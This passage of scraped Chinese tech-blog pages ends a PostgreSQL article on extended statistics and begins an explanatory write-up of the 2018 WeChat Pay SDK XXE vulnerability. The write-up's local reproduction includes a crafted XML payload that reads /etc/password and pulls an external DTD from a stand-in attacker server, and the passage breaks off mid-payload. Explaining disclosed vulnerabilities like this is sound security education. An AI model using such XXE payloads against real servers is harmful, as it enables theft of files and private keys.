<span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e3e569445023-7\">         <span class=\"crayon-i\">Sort</span> <span class=\"crayon-v\">Key</span><span class=\"crayon-o\">:</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e3e569445023-8\">         <span class=\"crayon-i\">Sort</span> <span class=\"crayon-v\">Method</span><span class=\"crayon-o\">:</span> <span class=\"crayon-i\">external</span> <span class=\"crayon-i\">sort</span>  <span class=\"crayon-v\">Disk</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">176128kB</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e3e569445023-9\">         <span class=\"crayon-o\">-&gt;</span>  <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..144247.84</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9999984</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.008..665.689</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e3e569445023-10\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.072</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e3e569445023-11\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">4494.583</span> <span class=\"crayon-v\">ms</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0234 seconds] -->\r\n<p>聚合行时，Postgres 选择做散列聚合或组合。 如果它认为散列表合适，则选择散列聚合，否则它会选择对所有行进行排序，然后按照 col1、col2 对它们进行分组。</p>\n<p>现在，planner 估计组的数量（等于 col1、col2 的不同值的数量）将为 100000。它预计到它没有足够的 work_mem 将该散列表存储在内存中。 因此，它使用基于磁盘的排序来运行该查询。 但是，正如在查询计划中所看到的那样，实际行数仅为 1001。也许，我们有足够的内存来执行哈希聚合。</p>\n<p>让 planner 去捕获 n_distinct 统计信息，重新运行查询并找出结果。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e42054113727\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE STATISTICS s2 (ndistinct) on col1, col2 from tbl;                                  \r\nANALYZE tbl;\r\n\r\nEXPLAIN ANALYZE SELECT col1,col2,count(*) from tbl group by col1, col2;                   \r\n                                                      QUERY PLAN                                                       \r\n-----------------------------------------------------------------------------------------------------------------------\r\n HashAggregate  (cost=219247.63..219257.63 rows=1000 width=16) (actual time=2431.767..2431.928 rows=1001 loops=1)\r\n   Group Key: col1, col2\r\n   -&gt;  Seq Scan on tbl  (cost=0.00..144247.79 rows=9999979 width=8) (actual time=0.008..643.488 rows=10000000 loops=1)\r\n Planning time: 0.129 ms\r\n Execution time: 2432.010 ms\r\n(5 rows)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e42054113727-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e42054113727-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e42054113727-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e42054113727-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e42054113727-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e42054113727-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e42054113727-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e42054113727-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e42054113727-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e42054113727-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e42054113727-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e42054113727-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e42054113727-1\"><span class=\"crayon-i\">CREATE</span> <span class=\"crayon-i\">STATISTICS</span> <span class=\"crayon-i\">s2</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">ndistinct</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span>                                  </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e42054113727-2\"><span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-v\">tbl</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e42054113727-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e42054113727-4\"><span class=\"crayon-i\">EXPLAIN</span> <span class=\"crayon-i\">ANALYZE</span> <span class=\"crayon-i\">SELECT</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-i\">from</span> <span class=\"crayon-i\">tbl</span> <span class=\"crayon-i\">group</span> <span class=\"crayon-i\">by</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">col2</span><span class=\"crayon-sy\">;</span>                   </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e42054113727-5\">                                                      <span class=\"crayon-i\">QUERY</span> <span class=\"crayon-i\">PLAN</span>                                                       </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e42054113727-6\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e42054113727-7\"> <span class=\"crayon-i\">HashAggregate</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">219247.63..219257.63</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1000</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2431.767..2431.928</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1001</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e42054113727-8\">   <span class=\"crayon-i\">Group</span> <span class=\"crayon-v\">Key</span><span class=\"crayon-o\">:</span> <span class=\"crayon-v\">col1</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">col2</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e42054113727-9\">   <span class=\"crayon-o\">-&gt;</span>  <span class=\"crayon-i\">Seq</span> <span class=\"crayon-i\">Scan</span> <span class=\"crayon-i\">on</span> <span class=\"crayon-i\">tbl</span>  <span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..144247.79</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9999979</span> <span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">(</span><span class=\"crayon-i\">actual</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.008..643.488</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10000000</span> <span class=\"crayon-v\">loops</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e42054113727-10\"> <span class=\"crayon-i\">Planning</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">0.129</span> <span class=\"crayon-i\">ms</span></div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e42054113727-11\"> <span class=\"crayon-i\">Execution</span> <span class=\"crayon-v\">time</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">2432.010</span> <span class=\"crayon-e\">ms</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e42054113727-12\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">5</span> <span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0218 seconds] -->\r\n<p>可以看到，现在的估算精度更高了（即 1000 ），查询速度也提高了2倍左右。 通过运行下面的查询，我们可以看到 planner 学到了什么。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab671cd4e46480674279\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT stxkeys AS k, stxndistinct AS nd                                                   \r\n  FROM pg_statistic_ext                                                                   \r\n  WHERE stxname = 's2'; \r\n  k  |       nd       \r\n-----+----------------\r\n 1 2 | {\"1, 2\": 1000}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e46480674279-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e46480674279-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e46480674279-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e46480674279-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671cd4e46480674279-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671cd4e46480674279-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671cd4e46480674279-1\"><span class=\"crayon-i\">SELECT</span> <span class=\"crayon-i\">stxkeys</span> <span class=\"crayon-st\">AS</span> <span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-i\">stxndistinct</span> <span class=\"crayon-st\">AS</span> <span class=\"crayon-i\">nd</span>                                                   </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e46480674279-2\">  <span class=\"crayon-i\">FROM</span> <span class=\"crayon-v\">pg_statistic</span><span class=\"crayon-sy\">_</span>ext                                                                   </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e46480674279-3\">  <span class=\"crayon-i\">WHERE</span> <span class=\"crayon-i\">stxname</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-s\">'s2'</span><span class=\"crayon-sy\">;</span> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e46480674279-4\">  <span class=\"crayon-i\">k</span>  <span class=\"crayon-o\">|</span>       <span class=\"crayon-i\">nd</span>       </div><div class=\"crayon-line\" id=\"crayon-5bab671cd4e46480674279-5\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671cd4e46480674279-6\"> <span class=\"crayon-cn\">1</span> <span class=\"crayon-cn\">2</span> <span class=\"crayon-o\">|</span> <span class=\"crayon-sy\">{</span><span class=\"crayon-s\">\"1, 2\"</span><span class=\"crayon-o\">:</span> <span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p><strong>现实影响</strong></p>\n<p>在实际的生产模式中，你总是会有某些与数据库不知道的相互依赖或关系的列。 以下是我们与 <a href=\"https://www.citusdata.com/product/\" rel=\"nofollow\">Citus</a> 客户见过的一些例子：</p>\n<ul>\n<li>有月份，季度和年份的列，因为你希望在报告中显示按所有人分组的统计信息。</li>\n<li>地理层次之间的关系。 例如。 具有国家，州和城市的列，并由它们来过滤/分组。</li>\n</ul>\n<p>这里的例子仅仅是在数据集中只有 10M 行的情况，并且我们已经看到，在存在相关列的情况下，使用 CREATE 统计信息可显着改善查询计划，并显示性能改进。在 Citus 使用案例中，我们有<a href=\"https://www.citusdata.com/customers/\" rel=\"nofollow\">客户</a>存储数十亿行数据，糟糕查询计划的影响可能非常严重。在上述示例中，当 planner 选择了一个糟糕的查询计划时，我们不得不为 10M 行做一个基于磁盘的分类。想象一下如果是数十亿行，那会有多糟糕。</p>\n<p> </p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114232\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114232votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114232\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/d925c992a1aa410e25f0bb681dae99423f162420.jpg"}
{"title": "谈谈微信支付曝出的漏洞", "url": "http://blog.jobbole.com/114197/", "create_date": "2018/07/06", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "url_object_id": "59fc427c393e917c69b31f0fb9989d00", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,安全", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9266224.html\">编程迷思</a>   </div><h1>一、背景</h1>\n<p>昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。</p>\n<p>漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3</p>\n<h1>二、漏洞原理</h1>\n<h2>1.  XXE漏洞</h2>\n<p>此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。</p>\n<p>XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/fd852c808e1da4c7f569a8ac7e846bb6.png\" alt=\"\"></p>\n<p>在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。</p>\n<p>可以说，<strong>XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。</strong>在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。</p>\n<h2>2.  微信支付漏洞</h2>\n<p>本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。</p>\n<p>SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</p>\n<p>SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d8373c58efb34c2810ec33cacbf601c.png\" alt=\"\"></p>\n<p>如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。</p>\n<h2>3.  攻击复现</h2>\n<p>下面在本机环境下进行复现。</p>\n<p>假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。</p>\n<p>攻击时构造的请求如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9606ad59ae08f52ccf9b7d1fe44b6c09.png\" alt=\"\"></p>\n<p>其中xml内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67217f10d845767993\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\r\n&lt;!DOCTYPE root [\r\n    &lt;!ENTITY % file SYSTEM \"file:///etc/password\"&gt;\r\n    &lt;!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/xxe.dtd\"&gt;\r\n    %xxe;\r\n]&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67217f10d845767993-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f10d845767993-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f10d845767993-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f10d845767993-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f10d845767993-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f10d845767993-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67217f10d845767993-1\"><span class=\"crayon-ta\">&lt;?</span><span class=\"crayon-e\">xml </span><span class=\"crayon-i\">version</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1.0\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">encoding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"utf-8\"</span><span class=\"crayon-ta\">?&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f10d845767993-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">DOCTYPE </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f10d845767993-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"file:///etc/password\"</span><span 